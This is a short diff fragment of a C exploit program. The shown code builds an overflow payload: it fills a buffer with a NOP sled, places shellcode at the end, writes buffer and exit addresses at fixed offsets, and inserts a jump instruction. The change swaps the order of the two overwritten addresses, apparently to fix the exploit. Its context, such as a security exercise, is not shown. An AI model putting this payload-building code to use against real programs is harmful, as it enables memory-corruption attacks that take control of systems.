@@ -20,8 +20,8 @@ int main(void)
 
   memset(payload, 0x90, sizeof(payload));
   memcpy(payload + sizeof(payload) - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);
-  *(int *)(payload + 130 - 4) = bufloc; // a
-  *(int *)(payload + 130 - 8) = exitloc; // p
+  *(int *)(payload + 130 - 4) = exitloc; // p
+  *(int *)(payload + 130 - 8) = bufloc; // a
   memcpy(payload + 130 - 10, jmpahead, 2); // jump
   payload[200] = 0x02;
 
